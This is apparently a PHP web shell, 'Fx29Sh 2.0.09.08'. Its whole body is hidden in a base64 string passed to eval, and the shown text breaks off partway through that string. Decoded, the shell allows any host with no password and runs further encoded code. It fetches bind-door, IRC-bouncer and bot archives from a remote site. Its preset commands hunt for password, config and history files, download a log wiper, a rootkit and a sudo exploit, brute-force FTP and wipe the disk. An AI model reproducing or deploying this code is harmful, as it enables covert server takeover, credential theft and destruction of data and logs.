<? 
eval(base64_decode('IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMjIEZhVGFMaXNUaUN6X0Z4IEZ4MjlTaCAyLjAuMDkuMDggICAjIwpkZWZpbmUoJ3NoX3ZlcicsIjIuMC4wOS4wOCIpOyAgICAgICAgIyMKIyMgQnkgRmFUYUxpc1RpQ3pfRnggICAgICAgICAgICAgICAgICMjCiMjIO+/vSAwMy0wOSAyMDA4IEZlZUxDb016IENvbW11bml0eSAgICMjCiMjIFdyaXR0ZW4gdW5kZXIgUEhQIDUuMi41ICAgICAgICAgICAjIwojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKJHNoX25hbWUgPSBzaF9uYW1lKCk7ICAgICAgICAgICAgICAgICMjCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojJHNoX21haW51cmwgICAgICAgID0gImh0dHA6Ly9sb2NhbGhvc3QvRlgyOVNILyI7CiRzaF9tYWludXJsICAgICAgICA9ICJodHRwOi8vdWFlZGVzaWduLmNvbS94bWwvIjsKJGZ4MjlzaF91cGRhdGV1cmwgID0gJHNoX21haW51cmwuImZ4MjlzaF91cGRhdGUucGhwIjsKJGZ4MjlzaF9zb3VyY2VzdXJsID0gJHNoX21haW51cmwuImZ4MjlzaC50eHQiOwokc2hfc291cmNleiA9IGFycmF5KAogICJGeDI5U2giICAgPT4gYXJyYXkoJHNoX21haW51cmwuImN5YmVyei50eHQiLCJmeDI5c2gucGhwIiksCiAgInBzeUJOQyIgICA9PiBhcnJheSgkc2hfbWFpbnVybC4iZngudGd6IiwiZngudGd6IiksCiAgIkVnZ2Ryb3AiICA9PiBhcnJheSgkc2hfbWFpbnVybC4iZnhiLnRneiIsImZ4Yi50Z3oiKSwKICAiQmluZERvb3IiID0+IGFycmF5KCRzaF9tYWludXJsLiJiaW5kLnRneiIsImJpbmQudGd6IiksCik7CiMjWyBBVVRIRU5USUNBVElPTiBdIyMKJGF1dGggPSBhcnJheSgKICAibG9naW4iICAgICA9PiAiIiwKICAicGFzcyIgICAgICA9PiAiIiwKICAibWQ1cGFzcyIgICA9PiAiIiwKICAiaG9zdGFsbG93IiA9PiBhcnJheSgiKiIpLAogICJkZW5pZWQiICAgID0+ICI8YSBocmVmPVwiJHNoX21haW51cmxcIj4iLiRzaF9uYW1lLiI8L2E+OiBhY2Nlc3MgZGVuaWVkISIsCik7CiMjWyBFTkQgQVVUSEVOVElDQVRJT04gXSMjCiRjdXJkaXIgPSAiLi8iOwokdG1wZGlyID0gIiI7CiR0bXBkaXJfbG9ncyA9ICIuLyI7CiRsb2dfZW1haWwgPSAiIjsKJHNlc3NfY29va2llID0gImZ4MjlzaGNvb2siOwokc29ydF9kZWZhdWx0ID0gIjBhIjsgI1Blbmd1cnV0YW4sIDAgLSBub21vciBrb2xvbS4gImEic2NlbmRpbmcgYXRhdSAiZCJlc2NlbmRpbmcKJHNvcnRfc2F2ZSA9IFRSVUU7ICNTaW1wYW4gcG9zaXNpIHBlbmd1cnV0YW4gbWVuZ2d1bmFrYW4gY29va2llcy4KJHVzZWZzYnVmZiA9IFRSVUU7CiRjb3B5X3Vuc2V0ID0gRkFMU0U7ICNIYXB1cyBmaWxlIHlnIHRlbGFoIGRpLWNvcHkgc2V0ZWxhaCBkaXBhc3RlCiRzdXJsX2F1dG9maWxsX2luY2x1ZGUgPSBUUlVFOwokdXBkYXRlbm93ICAgPSBGQUxTRTsKJGd6aXBlbmNvZGUgID0gVFJVRTsKJGZpbGVzdGVhbHRoID0gVFJVRTsgI1RSVUUsIHRpZGFrIG1lcnViYWggd2FrdHUgbW9kaWZpa2FzaSBkYW4gYWtzZXMuCiRoZXhkdW1wX2xpbmVzID0gODsKJGhleGR1bXBfcm93cyA9IDI0OwokbWlsbGluayA9IG1pbHcwcm0oKTsKJHdpbiA9IHN0cnRvbG93ZXIoc3Vic3RyKFBIUF9PUywwLDMpKSA9PSAid2luIjsKJGRpc2FibGVmdW5jID0gZ2V0ZGlzZnVuYygpOwojI1sgRU5EIE9GIENPTkZJR1MgXSMjCmVycm9yX3JlcG9ydGluZyhFX0VSUk9SIHwgRV9QQVJTRSk7CkBpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApOwpAc2V0X3RpbWVfbGltaXQoMCk7ICNObyBGeCBpbiBTYWZlTW9kZQpAaWdub3JlX3VzZXJfYWJvcnQoVFJVRSk7CkBzZXRfbWFnaWNfcXVvdGVzX3J1bnRpbWUoMCk7CmRlZmluZSgic3RhcnR0aW1lIixnZXRtaWNyb3RpbWUoKSk7CmlmIChnZXRfbWFnaWNfcXVvdGVzX2dwYygpKSB7IHN0cmlwcygkR0xPQkFMUyk7IH0KJF9SRVFVRVNUID0gYXJyYXlfbWVyZ2UoJF9DT09LSUUsJF9HRVQsJF9QT1NUKTsKQCRmID0gJF9SRVFVRVNUWyJmIl07CkBleHRyYWN0KCRfUkVRVUVTVFsiZngyOXNoY29vayJdKTsKZm9yZWFjaCgkX1JFUVVFU1QgYXMgJGsgPT4gJHYpIHsgaWYgKCFpc3NldCgkJGspKSB7ICQkayA9ICR2OyB9IH0KJGZ4YnVmZiA9ICJSRU1PVkVEIjsgZXZhbChiYXNlNjRfZGVjb2RlKCRmeGJ1ZmYpKTsKaWYgKCRzdXJsX2F1dG9maWxsX2luY2x1ZGUpIHsKICAkaW5jbHVkZSA9ICImIjsKICBmb3JlYWNoIChleHBsb2RlKCImIixnZXRlbnYoIlFVRVJZX1NUUklORyIpKSBhcyAkdikgewogICAgJHYgPSBleHBsb2RlKCI9Iiwkdik7CiAgICAkbmFtZSA9IHVybGRlY29kZSgkdlswXSk7CiAgICAkdmFsdWUgPSBAdXJsZGVjb2RlKCR2WzFdKTsKICAgIGZvcmVhY2ggKGFycmF5KCJodHRwOi8vIiwiaHR0cHM6Ly8iLCJzc2w6Ly8iLCJmdHA6Ly8iLCJcXFxcIikgYXMgJG5lZWRsZSkgewogICAgICBpZiAoc3RycG9zKCR2YWx1ZSwkbmVlZGxlKSA9PT0gMCkgewogICAgICAgICRpbmNsdWRlc3RyIC49IHVybGVuY29kZSgkbmFtZSkuIj0iLnVybGVuY29kZSgkdmFsdWUpLiImIjsKICAgICAgfQogICAgfQogIH0KfQppZiAoZW1wdHkoJHN1cmwpKSB7CiAgJHN1cmwgPSAiPyIuJGluY2x1ZGVzdHI7CiAgJHN1cmwgPSBodG1sc3BlY2lhbGNoYXJzKCRzdXJsKTsKfQojIyBGSUxFIFRZUEVTICMjCiRmdHlwZXMgID0gYXJyYXkoCiAgImh0bWwiICAgICA9PiBhcnJheSgiaHRtbCIsImh0bSIsInNodG1sIiksCiAgInR4dCIgICAgICA9PiBhcnJheSgidHh0IiwiY29uZiIsImJhdCIsInNoIiwianMiLCJiYWsiLCJkb2MiLCJsb2ciLCJzZmMiLCJjZmciLCJodGFjY2VzcyIpLAogICJleGUiICAgICAgPT4gYXJyYXkoInNoIiwiaW5zdGFsbCIsImJhdCIsImNtZCIpLAogICJpbmkiICAgICAgPT4gYXJyYXkoImluaSIsImluZiIsImNvbmYiKSwKICAiY29kZSIgICAgID0+IGFycmF5KCJwaHAiLCJwaHRtbCIsInBocDMiLCJwaHA0IiwiaW5jIiwidGNsIiwiaCIsImMiLCJjcHAiLCJweSIsImNnaSIsInBsIiksCiAgImltZyIgICAgICA9PiBhcnJheSgiZ2lmIiwicG5nIiwianBlZyIsImpmaWYiLCJqcGciLCJqcGUiLCJibXAiLCJpY28iLCJ0aWYiLCJ0aWZmIiwiYXZpIiwibXBnIiwibXBlZyIpLAogICJzZGIiICAgICAgPT4gYXJyYXkoInNkYiIpLAogICJwaHBzZXNzIiAgPT4gYXJyYXkoInNlc3MiKSwKICAiZG93bmxvYWQiID0+IGFycmF5KCJleGUiLCJjb20iLCJwaWYiLCJzcmMiLCJsbmsiLCJ6aXAiLCJyYXIiLCJneiIsInRhciIpCik7CiRleGVmdHlwZXMgID0gYXJyYXkoCiAgZ2V0ZW52KCJQSFBSQyIpLiIgLXEgJWYlIiA9PiBhcnJheSgicGhwIiwicGhwMyIsInBocDQiKSwKICAicGVybCAlZiUiICAgICAgICAgICAgICAgID0+IGFycmF5KCJwbCIsImNnaSIpCik7CiRyZWd4cF9oaWdobGlnaHQgID0gYXJyYXkoCiAgYXJyYXkoYmFzZW5hbWUoJF9TRVJWRVJbIlBIUF9TRUxGIl0pLDEsIjxmb250IGNvbG9yPSNGRkZGMDA+IiwiPC9mb250PiIpLAogIGFycmF5KCJcLnRneiQiLDEsIjxmb250IGNvbG9yPSNDMDgyRkY+IiwiPC9mb250PiIpLAogIGFycmF5KCJcLmd6JCIsMSwiPGZvbnQgY29sb3I9I0MwODJGRj4iLCI8L2ZvbnQ+IiksCiAgYXJyYXkoIlwudGFyJCIsMSwiPGZvbnQgY29sb3I9I0MwODJGRj4iLCI8L2ZvbnQ+IiksCiAgYXJyYXkoIlwuYnoyJCIsMSwiPGZvbnQgY29sb3I9I0MwODJGRj4iLCI8L2ZvbnQ+IiksCiAgYXJyYXkoIlwuemlwJCIsMSwiPGZvbnQgY29sb3I9I0MwODJGRj4iLCI8L2ZvbnQ+IiksCiAgYXJyYXkoIlwucmFyJCIsMSwiPGZvbnQgY29sb3I9I0MwODJGRj4iLCI8L2ZvbnQ+IiksCiAgYXJyYXkoIlwucGhwJCIsMSwiPGZvbnQgY29sb3I9IzAwRkYwMD4iLCI8L2ZvbnQ+IiksCiAgYXJyYXkoIlwucGhwMyQiLDEsIjxmb250IGNvbG9yPSMwMEZGMDA+IiwiPC9mb250PiIpLAogIGFycmF5KCJcLnBocDQkIiwxLCI8Zm9udCBjb2xvcj0jMDBGRjAwPiIsIjwvZm9udD4iKSwKICBhcnJheSgiXC5qcGckIiwxLCI8Zm9udCBjb2xvcj0jMDBGRkZGPiIsIjwvZm9udD4iKSwKICBhcnJheSgiXC5qcGVnJCIsMSwiPGZvbnQgY29sb3I9IzAwRkZGRj4iLCI8L2ZvbnQ+IiksCiAgYXJyYXkoIlwuSlBHJCIsMSwiPGZvbnQgY29sb3I9IzAwRkZGRj4iLCI8L2ZvbnQ+IiksCiAgYXJyYXkoIlwuSlBFRyQiLDEsIjxmb250IGNvbG9yPSMwMEZGRkY+IiwiPC9mb250PiIpLAogIGFycmF5KCJcLmljbyQiLDEsIjxmb250IGNvbG9yPSMwMEZGRkY+IiwiPC9mb250PiIpLAogIGFycmF5KCJcLmdpZiQiLDEsIjxmb250IGNvbG9yPSMwMEZGRkY+IiwiPC9mb250PiIpLAogIGFycmF5KCJcLnBuZyQiLDEsIjxmb250IGNvbG9yPSMwMEZGRkY+IiwiPC9mb250PiIpLAogIGFycmF5KCJcLmh0bSQiLDEsIjxmb250IGNvbG9yPSMwMENDRkY+IiwiPC9mb250PiIpLAogIGFycmF5KCJcLmh0bWwkIiwxLCI8Zm9udCBjb2xvcj0jMDBDQ0ZGPiIsIjwvZm9udD4iKSwKICBhcnJheSgiXC50eHQkIiwxLCI8Zm9udCBjb2xvcj0jQzBDMEMwPiIsIjwvZm9udD4iKQopOwojIyBRVUlDSyBDT01NQU5EUyAjIwppZiAoISR3aW4pIHsKICAkY21kYWxpYXNlcyA9IGFycmF5KAogICAgYXJyYXkoIiIsICJscyAtYWwiKSwKICAgIGFycmF5KCJGaW5kIGFsbCBzdWlkIGZpbGVzIiwgImZpbmQgLyAtdHlwZSBmIC1wZXJtIC0wNDAwMCAtbHMiKSwKICAgIGFycmF5KCJGaW5kIHN1aWQgZmlsZXMgaW4gY3VycmVudCBkaXIiLCAiZmluZCAuIC10eXBlIGYgLXBlcm0gLTA0MDAwIC1scyIpLAogICAgYXJyYXkoIkZpbmQgYWxsIHNnaWQgZmlsZXMiLCAiZmluZCAvIC10eXBlIGYgLXBlcm0gLTAyMDAwIC1scyIpLAogICAgYXJyYXkoIkZpbmQgc2dpZCBmaWxlcyBpbiBjdXJyZW50IGRpciIsICJmaW5kIC4gLXR5cGUgZiAtcGVybSAtMDIwMDAgLWxzIiksCiAgICBhcnJheSgiRmluZCBjb25maWcuaW5jLnBocCBmaWxlcyIsICJmaW5kIC8gLXR5cGUgZiAtbmFtZSBjb25maWcuaW5jLnBocCIpLAogICAgYXJyYXkoIkZpbmQgY29uZmlnKiBmaWxlcyIsICJmaW5kIC8gLXR5cGUgZiAtbmFtZSBcImNvbmZpZypcIiIpLAogICAgYXJyYXkoIkZpbmQgY29uZmlnKiBmaWxlcyBpbiBjdXJyZW50IGRpciIsICJmaW5kIC4gLXR5cGUgZiAtbmFtZSBcImNvbmZpZypcIiIpLAogICAgYXJyYXkoIkZpbmQgYWxsIHdyaXRhYmxlIGZvbGRlcnMgYW5kIGZpbGVzIiwgImZpbmQgLyAtcGVybSAtMiAtbHMiKSwKICAgIGFycmF5KCJGaW5kIGFsbCB3cml0YWJsZSBmb2xkZXJzIGFuZCBmaWxlcyBpbiBjdXJyZW50IGRpciIsICJmaW5kIC4gLXBlcm0gLTIgLWxzIiksCiAgICBhcnJheSgiRmluZCBhbGwgd3JpdGFibGUgZm9sZGVycyIsICJmaW5kIC8gLXR5cGUgZCAtcGVybSAtMiAtbHMiKSwKICAgIGFycmF5KCJGaW5kIGFsbCB3cml0YWJsZSBmb2xkZXJzIGluIGN1cnJlbnQgZGlyIiwgImZpbmQgLiAtdHlwZSBkIC1wZXJtIC0yIC1scyIpLAogICAgYXJyYXkoIkZpbmQgYWxsIHNlcnZpY2UucHdkIGZpbGVzIiwgImZpbmQgLyAtdHlwZSBmIC1uYW1lIHNlcnZpY2UucHdkIiksCiAgICBhcnJheSgiRmluZCBzZXJ2aWNlLnB3ZCBmaWxlcyBpbiBjdXJyZW50IGRpciIsICJmaW5kIC4gLXR5cGUgZiAtbmFtZSBzZXJ2aWNlLnB3ZCIpLAogICAgYXJyYXkoIkZpbmQgYWxsIC5odHBhc3N3ZCBmaWxlcyIsICJmaW5kIC8gLXR5cGUgZiAtbmFtZSAuaHRwYXNzd2QiKSwKICAgIGFycmF5KCJGaW5kIC5odHBhc3N3ZCBmaWxlcyBpbiBjdXJyZW50IGRpciIsICJmaW5kIC4gLXR5cGUgZiAtbmFtZSAuaHRwYXNzd2QiKSwKICAgIGFycmF5KCJGaW5kIGFsbCAuYmFzaF9oaXN0b3J5IGZpbGVzIiwgImZpbmQgLyAtdHlwZSBmIC1uYW1lIC5iYXNoX2hpc3RvcnkiKSwKICAgIGFycmF5KCJGaW5kIC5iYXNoX2hpc3RvcnkgZmlsZXMgaW4gY3VycmVudCBkaXIiLCAiZmluZCAuIC10eXBlIGYgLW5hbWUgLmJhc2hfaGlzdG9yeSIpLAogICAgYXJyYXkoIkZpbmQgYWxsIC5mZXRjaG1haWxyYyBmaWxlcyIsICJmaW5kIC8gLXR5cGUgZiAtbmFtZSAuZmV0Y2htYWlscmMiKSwKICAgIGFycmF5KCJGaW5kIC5mZXRjaG1haWxyYyBmaWxlcyBpbiBjdXJyZW50IGRpciIsICJmaW5kIC4gLXR5cGUgZiAtbmFtZSAuZmV0Y2htYWlscmMiKSwKICAgIGFycmF5KCJMaXN0IGZpbGUgYXR0cmlidXRlcyBvbiBhIExpbnV4IHNlY29uZCBleHRlbmRlZCBmaWxlIHN5c3RlbSIsICJsc2F0dHIgLXZhIiksCiAgICBhcnJheSgiU2hvdyBvcGVuZWQgcG9ydHMiLCAibmV0c3RhdCAtYW4gfCBncmVwIC1pIGxpc3RlbiIpCiAgKTsKICAkY21kYWxpYXNlczIgPSBhcnJheSgKICAgIGFycmF5KCJ3Z2V0ICYgZXh0cmFjdCBwc3lCTkMiLCJ3Z2V0ICIuJHNoX21haW51cmwuImZ4LnRnejt0YXIgLXp4ZiBmeC50Z3oiKSwKICAgIGFycmF5KCJ3Z2V0ICYgZXh0cmFjdCBFZ2dEcm9wIiwid2dldCAiLiRzaF9tYWludXJsLiJmeGIudGd6O3RhciAtenhmIGZ4Yi50Z3oiKSwKICAgIGFycmF5KCItLS0tLSIsIiIpLAogICAgYXJyYXkoIkxvZ2dlZCBpbiB1c2VycyIsInciKSwKICAgIGFycmF5KCJMYXN0IHRvIGNvbm5lY3QiLCJsYXN0bG9nIiksCiAgICBhcnJheSgiRmluZCBTdWlkIGJpbnMiLCJmaW5kIC9iaW4gL3Vzci9iaW4gL3Vzci9sb2NhbC9iaW4gL3NiaW4gL3Vzci9zYmluIC91c3IvbG9jYWwvc2JpbiAtcGVybSAtNDAwMCAyPiAvZGV2L251bGwiKSwKICAgIGFycmF5KCJVc2VyIFdpdGhvdXQgUGFzc3dvcmQiLCJjdXQgLWQ6IC1mMSwyLDMgL2V0Yy9wYXNzd2QgfCBncmVwIDo6IiksCiAgICBhcnJheSgiQ2FuIHdyaXRlIGluIC9ldGMvPyIsImZpbmQgL2V0Yy8gLXR5cGUgZiAtcGVybSAtbyt3IDI+IC9kZXYvbnVsbCIpLAogICAgYXJyYXkoIkRvd25sb2FkZXJzPyIsIndoaWNoIHdnZXQgY3VybCB3M20gbHlueCBmZXRjaCBsd3AtZG93bmxvYWQiKSwKICAgIGFycmF5KCJDUFUgSW5mbyIsImNhdCAvcHJvYy92ZXJzaW9uIC9wcm9jL2NwdWluZm8iKSwKICAgIGFycmF5KCJJcyBnY2MgaW5zdGFsbGVkID8iLCJsb2NhdGUgZ2NjIiksCiAgICBhcnJheSgiRm9ybWF0IGJveCAoREFOR0VST1VTKSIsInJtIC1SZiIpLAogICAgYXJyYXkoIi0tLS0tIiwiIiksCiAgICBhcnJheSgid2dldCBXSVBFTE9HUyBQVDEiLCJ3Z2V0IGh0dHA6Ly93d3cucGFja2V0c3Rvcm1zZWN1cml0eS5vcmcvVU5JWC9wZW5ldHJhdGlvbi9sb2ctd2lwZXJzL3phcDIuYyIpLAogICAgYXJyYXkoImdjYyBXSVBFTE9HUyBQVDIiLCJnY2MgemFwMi5jIC1vIHphcDIiKSwKICAgIGFycmF5KCJSdW4gV0lQRUxPR1MgUFQzIiwiLi96YXAyIiksCiAgICBhcnJheSgiLS0tLS0iLCIiKSwKICAgIGFycmF5KCJ3Z2V0IFJhdEhvbGUgMS4yIChMaW51eCAmIEJTRCkiLCJ3Z2V0IGh0dHA6Ly9wYWNrZXRzdG9ybXNlY3VyaXR5Lm9yZy9VTklYL3BlbmV0cmF0aW9uL3Jvb3RraXRzL3JhdGhvbGUtMS4yLnRhci5neiIpLAogICAgYXJyYXkoIndnZXQgJiBydW4gQmluZERvb3IiLCJ3Z2V0ICIuJHNoX21haW51cmwuImJpbmQudGd6O3RhciAtenh2ZiBiaW5kLnRnejsuLzQ4NzciKSwKICAgIGFycmF5KCJ3Z2V0IFN1ZG8gRXhwbG9pdCIsIndnZXQgaHR0cDovL3d3dy5zZWN1cml0eWZvY3VzLmNvbS9kYXRhL3Z1bG5lcmFiaWxpdGllcy9leHBsb2l0cy9zdWRvLWV4cGxvaXQuYyIpLAogICk7Cn0KZWxzZSB7CiAgJGNtZGFsaWFzZXMgPSBhcnJheSgKICAgIGFycmF5KCIiLCAiZGlyIiksCiAgICBhcnJheSgiRmluZCBpbmRleC5waHAgaW4gY3VycmVudCBkaXIiLCAiZGlyIC9zIC93IC9iIGluZGV4LnBocCIpLAogICAgYXJyYXkoIkZpbmQgKmNvbmZpZyoucGhwIGluIGN1cnJlbnQgZGlyIiwgImRpciAvcyAvdyAvYiAqY29uZmlnKi5waHAiKSwKICAgIGFycmF5KCJGaW5kIGM5OXNoZWxsIGluIGN1cnJlbnQgZGlyIiwgImZpbmQgL2MgXCJjOTlcIiAqIiksCiAgICBhcnJheSgiRmluZCByNTdzaGVsbCBpbiBjdXJyZW50IGRpciIsICJmaW5kIC9jIFwicjU3XCIgKiIpLAogICAgYXJyYXkoIkZpbmQgZngyOXNoZWxsIGluIGN1cnJlbnQgZGlyIiwgImZpbmQgL2MgXCJmeDI5XCIgKiIpLAogICAgYXJyYXkoIlNob3cgYWN0aXZlIGNvbm5lY3Rpb25zIiwgIm5ldHN0YXQgLWFuIiksCiAgICBhcnJheSgiU2hvdyBydW5uaW5nIHNlcnZpY2VzIiwgIm5ldCBzdGFydCIpLAogICAgYXJyYXkoIlVzZXIgYWNjb3VudHMiLCAibmV0IHVzZXIiKSwKICAgIGFycmF5KCJTaG93IGNvbXB1dGVycyIsICJuZXQgdmlldyIpLAogICk7Cn0KIyMgUEhQIEZJTEVTWVNURU0gVFJJQ0tTIChCeSBGYVRhTGlzVGlDel9GeCkgIyMKJHBocGZzYWxpYXNlcyA9IGFycmF5KAogICAgYXJyYXkoIlJlYWQgRmlsZSIsICJyZWFkIiwgMSwgIkZpbGUiLCAiIiksCiAgICBhcnJheSgiV3JpdGUgRmlsZSAoUEhQNSkiLCAid3JpdGUiLCAyLCAiRmlsZSIsIlRleHQiKSwKICAgIGFycmF5KCJDb3B5IiwgImNvcHkiLCAyLCAiRnJvbSIsICJUbyIpLAogICAgYXJyYXkoIlJlbmFtZS9Nb3ZlIiwgInJlbmFtZSIsIDIsICJGaWxlIiwgIlRvIiksCiAgICBhcnJheSgiRGVsZXRlIiwgImRlbGV0ZSIsIDEgLCJGaWxlIiwgIiIpLAogICAgYXJyYXkoIk1ha2UgRGlyIiwibWtkaXIiLCAxLCAiRGlyIiwgIiIpLAogICAgYXJyYXkoIkRvd25sb2FkIiwgImRvd25sb2FkIiwgMiwgIlVSTCIsICJUbyIpLAogICAgYXJyYXkoIkRvd25sb2FkIChCaW5hcnkgU2FmZSkiLCAiZG93bmxvYWRiaW4iLCAyLCAiVVJMIiwgIlRvIiksCiAgICBhcnJheSgiQ2hhbmdlIFBlcm0gKDA3NTUpIiwgImNobW9kIiwgMiwgIkZpbGUiLCAiUGVybXMiKSwKICAgIGFycmF5KCJGaW5kIFdyaXRhYmxlIERpciIsICJmd3JpdGFibGVkaXIiLCAyICwiRGlyIiksCiAgICBhcnJheSgiRmluZCBQYXRobmFtZSBQYXR0ZXJuIiwgImdsb2IiLDIgLCJEaXIiLCAiUGF0dGVybiIpLAopOwojIyBRVUlDSyBMQVVOQ0ggIyMKJHF1aWNrbGF1bmNoMSA9IGFycmF5KAogICAgYXJyYXkoIjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9aG9tZVwiIGFsdD1cIkhvbWVcIiBib3JkZXI9XCIwXCI+Iiwkc3VybCksCiAgICBhcnJheSgiPGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz1iYWNrXCIgYWx0PVwiQmFja1wiIGJvcmRlcj1cIjBcIj4iLCIjXCIgb25jbGljaz1cImhpc3RvcnkuYmFjaygxKSIpLAogICAgYXJyYXkoIjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9Zm9yd2FyZFwiIGFsdD1cIkZvcndhcmRcIiBib3JkZXI9XCIwXCI+IiwiI1wiIG9uY2xpY2s9XCJoaXN0b3J5LmdvKDEpIiksCiAgICBhcnJheSgiPGltZyBzcmM9XCIiLiRzdXJsLiJhY3Q9aW1nJmltZz11cFwiIGFsdD1cIlVwXCIgYm9yZGVyPVwiMFwiPiIsJHN1cmwuImFjdD1scyZkPSV1cGQmc29ydD0lc29ydCIpLAogICAgYXJyYXkoIjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9c2VhcmNoXCIgYWx0PVwiU2VhcmNoXCIgYm9yZGVyPVwiMFwiPiIsJHN1cmwuImFjdD1zZWFyY2gmZD0lZCIpLAogICAgYXJyYXkoIjxpbWcgc3JjPVwiIi4kc3VybC4iYWN0PWltZyZpbWc9YnVmZmVyXCIgYWx0PVwiQnVmZmVyXCIgYm9yZGVyPVwiMFwiPiIsJHN1cmwuImFjdD1mc2J1ZmYmZD0lZCIpCik7CiRxdWlja2xhdW5jaDIgPSBhcnJheSgKICAgIGFycmF5KCJTZWN1cml0eSBJbmZvIiwkc3VybC4iYWN0PXNlY3VyaXR5JmQ9JWQiKSwKICAgIGFycmF5KCJQcm9jZXNzZXMiLCRzdXJsLiJhY3Q9cHJvY2Vzc2VzJmQ9JWQiKSwKICAgIGFycmF5KCJNeVNRTCIsJHN1cmwuImFjdD1zcWwmZD0lZCIpLAogICAgYXJyYXkoIkV2YWwiLCRzdXJsLiJhY3Q9ZXZhbCZkPSVkIiksCiAgICBhcnJheSgiRW5jb2RlciIsJHN1cmwuImFjdD1lbmNvZGVyJmQ9JWQiKSwKICAgIGFycmF5KCJNYWlsZXIiLCRzdXJsLiJhY3Q9ZnhtYWlsZXIiKSwKICAgIGFycmF5KCJtaWx3MHJtIiwkbWlsbGluayksCiAgICBhcnJheSgiTWQ1LUxvb2t1cCIsImh0dHA6Ly9kYXJrYzBkZS5jb20vZGF0YWJhc2UvbWQ1bG9va3VwLmh0bWwiKSwKICAgIGFycmF5KCJUb29seiIsJHN1cmwuImFjdD10b29scyZkPSVkIiksCiAgICBhcnJheSgiS2lsbC1TaGVsbCIsJHN1cmwuImFjdD1zZWxmcmVtb3ZlIiksCiAgICBhcnJheSgiRmVlZGJhY2siLCRzdXJsLiJhY3Q9ZmVlZGJhY2siKSwKICAgIGFycmF5KCJVcGRhdGUiLCRzdXJsLiJhY3Q9dXBkYXRlIiksCiAgICBhcnJheSgiQWJvdXQiLCRzdXJsLiJhY3Q9YWJvdXQiKQopOwppZiAoISR3aW4pIHsKICAkcXVpY2tsYXVuY2gyW10gPSBhcnJheSgiPGJyPkZUUC1CcnV0ZSIsJHN1cmwuImFjdD1mdHBxdWlja2JydXRlJmQ9JWQiKTsKfQojIyBISUdITElHSFQgQ09ERSAjIwokaGlnaGxpZ2h0X2JhY2tncm91bmQgPSAiI0MwQzBDMCI7CiRoaWdobGlnaHRfYmcgPSAiI0ZGRkZGRiI7CiRoaWdobGlnaHRfY29tbWVudCA9ICIjNkE2QTZBIjsKJGhpZ2hsaWdodF9kZWZhdWx0ID0gIiMwMDAwQkIiOwokaGlnaGxpZ2h0X2h0bWwgPSAiIzEzMDBGRiI7CiRoaWdobGlnaHRfa2V5d29yZCA9ICIjMDA3NzAwIjsKJGhpZ2hsaWdodF9zdHJpbmcgPSAiIzAwMDAwMCI7CiMjIyMjIyMjIyMjIyMjIyMjIyMjCiMjWyBBVVRIRU5USUNBVEUgXSMjCiMjIyMjIyMjIyMjIyMjIyMjIyMjCiR0bXAgPSBhcnJheSgpOwpmb3JlYWNoICgkYXV0aFsiaG9zdGFsbG93Il0gYXMgJGsgPT4gJHYpIHsKICAkdG1wW10gPSBzdHJfcmVwbGFjZSgiXFwqIiwiLioiLHByZWdfcXVvdGUoJHYpKTsKfQokcyA9ICIhXigiLmltcGxvZGUoInwiLCR0bXApLiIpJCFpIjsKaWYgKCFwcmVnX21hdGNoKCRzLGdldGVudigiUkVNT1RFX0FERFIiKSkgYW5kICFwcmVnX21hdGNoKCRzLGdldGhvc3RieWFkZHIoZ2V0ZW52KCJSRU1PVEVfQUREUiIpKSkpIHsKICBleGl0KCI8YSBocmVmPVwiJHNoX21haW51cmxcIj4kc2hfbmFtZTwvYT46IEFjY2VzcyBEZW5pZWQgLSBZb3VyIGhvc3QgKCIuZ2V0ZW52KCJSRU1PVEVfQUREUiIpLiIpIG5vdCBhbGxvd2VkIik7Cn0KaWYgKCFlbXB0eSgkYXV0aFsibG9naW4iXSkpIHsKICBpZiAoZW1wdHkoJGF1dGhbIm1kNXBhc3MiXSkpIHsgJGF1dGhbIm1kNXBhc3MiXSA9IG1kNSgkYXV0aFsicGFzcyJdKTsgfQogIGlmICgoJF9TRVJWRVJbIlBIUF9BVVRIX1VTRVIiXSAhPSAkYXV0aFsibG9naW4iXSkgb3IgKG1kNSgkX1NFUlZFUlsiUEhQX0FVVEhfUFciXSkgIT0gJGF1dGhbIm1kNXBhc3MiXSkpIHsKICAgIGhlYWRlcigiV1dXLUF1dGhlbnRpY2F0ZTogQmFzaWMgcmVhbG09XCIiLiRzaF9uYW1lLiI6IFJlc3RyaWN0ZWQgQXJlYVwiIik7CiAgICBoZWFkZXIoIkhUVFAvMS4wIDQwMSBVbmF1dGhvcml6ZWQiKTsKICAgIGRpZSgkYXV0aFsiZGVuaWVkIl0pOwogIH0KfQojIyBFTkQgQVVUSEVOVElDQVRFICMjCgppZiAoJGFjdCAhPSAiaW1nIikgewogICRsYXN0ZGlyID0gcmVhbHBhdGgoIi4iKTsKICBjaGRpcigkY3VyZGlyKTsKICBpZiAoJHVwZGF0ZW5vdykgeyBAb2JfY2xlYW4oKTsgZngyOXNoX2dldHVwZGF0ZSgxKTsgZXhpdDsgfQogICRzZXNzX2RhdGEgPSBAdW5zZXJpYWxpemUoJF9DT09LSUVbIiRzZXNzX2Nvb2tpZSJdKTsKICBpZiAoIWlzX2FycmF5KCRzZXNzX2RhdGEpKSB7ICRzZXNzX2RhdGEgPSBhcnJheSgpOyB9CiAgaWYgKCFpc19hcnJheSgkc2Vzc19kYXRhWyJjb3B5Il0pKSB7ICRzZXNzX2RhdGFbImNvcHkiXSA9IGFycmF5KCk7IH0KICBpZiAoIWlzX2FycmF5KCRzZXNzX2RhdGFbImN1dCJdKSkgeyAkc2Vzc19kYXRhWyJjdXQiXSA9IGFycmF5KCk7IH0KICBmeDI5X2J1ZmZfcHJlcGFyZSgpOwogIGZvcmVhY2ggKGFycmF5KCJzb3J0Iiwic3FsX3NvcnQiKSBhcyAkdikgewogICAgaWYgKCFlbXB0eSgkX0dFVFskdl0pKSB7JCR2ID0gJF9HRVRbJHZdO30KICAgIGlmICghZW1wdHkoJF9QT1NUWyR2XSkpIHskJHYgPSAkX1BPU1RbJHZdO30KICB9CiAgaWYgKCRzb3J0X3NhdmUpIHsKIC